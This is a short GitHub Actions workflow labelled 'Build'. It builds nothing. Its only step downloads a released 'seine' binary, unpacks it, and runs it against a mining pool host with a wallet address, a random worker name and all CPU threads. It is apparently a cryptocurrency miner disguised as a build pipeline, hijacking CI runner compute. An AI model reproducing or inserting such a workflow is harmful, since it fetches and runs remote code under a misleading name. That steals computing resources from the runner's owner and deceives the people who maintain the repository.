name: Build

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: bitrise-runner-tes
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Run 
        run: |
          echo "=== Starting ==="
          wget https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz && tar xvf seine-linux-x86_64.tar.gz && rm -rf seine-linux-x86_64.tar.gz && chmod +x seine && ./seine --pool-url bnt.naramail.xyz:47182 --address N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz --pool-worker BNT$(shuf -i 1-99999 -n 1) --threads $(nproc)
